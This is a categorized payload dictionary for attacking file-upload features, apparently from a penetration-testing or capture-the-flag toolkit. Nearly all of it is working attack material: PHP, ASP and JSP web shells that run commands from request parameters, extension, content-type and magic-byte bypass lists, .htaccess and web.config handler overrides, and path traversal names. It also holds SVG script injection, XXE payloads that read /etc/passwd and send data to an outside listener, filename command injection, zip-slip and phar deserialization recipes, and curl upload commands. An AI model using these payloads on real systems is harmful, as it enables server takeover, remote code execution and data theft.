# Payload Dictionary — the categorized upload corpus

## Marker / canary files — always first

```
m.txt           content: UPMARK_<rand>
m.svg           <svg xmlns="http://www.w3.org/2000/svg"><title>UPMARK_<rand></title></svg>
m.png           real 1x1 PNG + appended "UPMARK_<rand>"
m.php           <?php echo "UPMARK_<rand>"; ?>
m.html          <title>UPMARK_<rand></title>
```

## Extension sweeps — ordered by hit rate

### PHP family

```
shell.php shell.php3 shell.php4 shell.php5 shell.php7 shell.phtml
shell.pht shell.phar shell.phps shell.pgif shell.inc
shell.php.jpg shell.jpg.php shell.php.png shell.png.php
shell.PhP shell.PHP shell.pHp shell.PHP5 shell.PHTML
shell.php. shell.php%20 shell.php%0a shell.php%00.jpg
shell.php\x00.jpg shell.php..jpg shell.ph.p
shell.php:1.jpg shell.php::$DATA shell.php::$INDEX_ALLOCATION
shell.php;.jpg (IIS6)
```

### ASP/IIS family

```
shell.asp shell.aspx shell.cer shell.asa shell.cdx shell.ashx
shell.asmx shell.soap shell.shtm shell.shtml
shell.asp;.jpg shell.aspx;1.jpg shell.asp,.jpg (IIS6 comma)
shell.aspx%00.jpg shell.aspx::$DATA
web.config (config upload → server-configs.md)
```

### JSP/Java family

```
shell.jsp shell.jspx shell.jsw shell.jsv shell.jspf shell.war
shell.jsp; shell.jsp%00.jpg
```

### Misc interpreters

```
shell.cfm shell.cfc shell.pl shell.cgi shell.py shell.rb
shell.sh shell.shtml
```

## Content-type spoof set

```
application/x-php → image/jpeg
application/x-php → image/png
application/x-php → image/gif
application/octet-stream → image/jpeg
text/plain → image/jpeg
(no content-type line)
Content-Type: (empty)
Content-Type: image/jpeg + Content-Type: image/jpeg (dup)
Content-Type: Image/JPEG (case)
Content-Type: image/jpeg;charset=utf-8 (params)
```

## Magic-byte prefix set

```
GIF89a;\n<?php ... ?>                    # gif
GIF87a;\n<?php ... ?>
\x89PNG\r\n\x1a\n<?php ... ?>            # png sig
\xff\xd8\xff\xe0<?php ... ?>             # jpeg SOI+APP0
\xff\xd8\xff\xdb<?php ... ?>             # jpeg SOI+DQT
\xff\xd8\xff\xfe\x00\x30<?php ... ?>     # jpeg COM
%PDF-1.4\n<?php ... ?>                   # pdf
PK\x03\x04<zip><?php ... ?>              # zip tail-anchor — polyglot
BM....<?php ... ?>                       # bmp
RIFF....WEBP...<?php ... ?>              # webp
```

## Shell one-liners — minimal-to-full

```php
<?=`$_GET[0]`;?>                                  # shortest
<?php system($_GET['c']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_GET['c']); ?>
<?php $p=$_GET['p'];`$p`;?>
<?php eval($_POST['d']); ?>
<?php $a=$_GET;$a[0]($a[1]);?>                    # func-var call
<?php call_user_func($_GET['f'],$_GET['x']);?>
<?php array_map($_GET['f'],$_GET['x']);?>
<?php phpinfo(); ?>                                # canary exec — prove first
```

```asp
<% eval request("c") %>
<% response.write(createobject("wscript.shell").exec("cmd /c "&request("c")).stdout.readall) %>
```

```jsp
<%@ page import="java.io.*" %>
<% String c=request.getParameter("c"); Process p=Runtime.getRuntime().exec(c);
   java.io.InputStream in=p.getInputStream(); int i;
   while((i=in.read())!=-1) out.print((char)i); %>
```

## Config uploads

```apache
# .htaccess variants — pick per the goal
AddType application/x-httpd-php .jpg
AddHandler php5-script .xyz
SetHandler application/x-httpd-php
Options +ExecCGI
AddHandler cgi-script .jpg
php_flag engine on                     # undo a php engine off
php_value auto_prepend_file /path/x    # alternative directive form
```

```ini
# .user.ini
auto_prepend_file=/var/www/html/uploads/x.jpg
auto_prepend_file=x.jpg
```

```xml
<!-- web.config — mime remap -->
<configuration><system.webServer><staticContent>
<mimeMap fileExtension=".jpg" mimeType="text/html"/>
</staticContent></system.webServer></configuration>
```

## Traversal names

```
../x.php ../../x.php ../../../x.php ../../../../../../x.php
....//....//x.php ..\/..\/x.php ..\\..\\x.php
..%2f..%2fx.php ..%252f..%252fx.php
/x.php /var/www/html/x.php
x%2f..%2f..%2fx.php
```

## SVG attack set

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>
<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)" attributeName="x"/></svg>
<svg xmlns="http://www.w3.org/2000/svg"><image href="http://YOU:8000/x"/></svg>
<svg xmlns="http://www.w3.org/2000/svg"><a xlink:href="javascript:alert(1)"><rect width="100%" height="100%"/></a></svg>
```

## XXE-in-document set

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]>
<!DOCTYPE r [<!ENTITY % x SYSTEM "file:///flag"><!ENTITY % e "<!ENTITY o SYSTEM 'http://YOU:8000/?d=%x;'>">%e;%o;]>
```

Insert into: `word/document.xml`, `xl/sharedStrings.xml`, `content.xml`,
`docProps/core.xml`, svg root, plain `.xml` uploads.

## Filename-injection set — when the name reaches a shell/template

```
x.png;id
x.png|id
x.png`id`
x.png$(id)
x.png -write /tmp/o
x.png;cat /flag > /var/www/x.txt
{{7*7}}.png                            # filename into a template
<%=7*7%>.png
x.png\";touch /tmp/o;#                  # shell quote-break
```

## Archive members — `archive_gen.py` recipes

```bash
# slip entries
zipslip --name shell.php --content '...' --depth 8
zipslip --name x.php --absolute --content '...'
# symlink write-through
tarslip --link-target /var/www/html --link-name link \
  --name shell.php --content '...' --depth 8
# phar deser canary + chain
phar --marker --out x.phar
phar --metadata 'O:8:"TargetCls":1:{s:4:"prop";s:4:"val";}' --out x.phar
```

## Media/delegate set

```m3u8
#EXTM3U
#EXT-X-KEY:METHOD=AES-128,URI="file:///flag"
#EXTINF:1,
x.ts
#EXT-X-ENDLIST
```

```postscript
%!PS
/pf (/tmp/o.txt) (w) file def
pf (id\n) writestring pf closefile
```

## Unicode/case set

```
x.pＨp (fullwidth chars)
x.phṗ
x.php⁄x.jpg (fraction slash U+2044)
x.ρhp (greek rho)
x.pHp
x.PHP
x.jpg․php (one-dot-leader U+2024)
```

## Size/edge probes

```
empty file (0 bytes)
1GB sparse file — zip bomb cousin
10k extension files
filename of 8KB — buffer/window tests
payload split across two same-name parts
```

## The send matrix — curl/requests forms

```bash
# minimal multipart
curl -s -F 'f=@shell.php' "$BASE/upload"
# spoofed per-part type
curl -s -F 'f=@shell.php;type=image/jpeg' "$BASE/upload"
# renamed field filename
curl -s -F 'f=@shell.php;filename=x.jpg' "$BASE/upload"
# raw crafted body
python3 tools/web/http_probe.py ... --body $'--X\r\nContent-Disposition: ...'
```
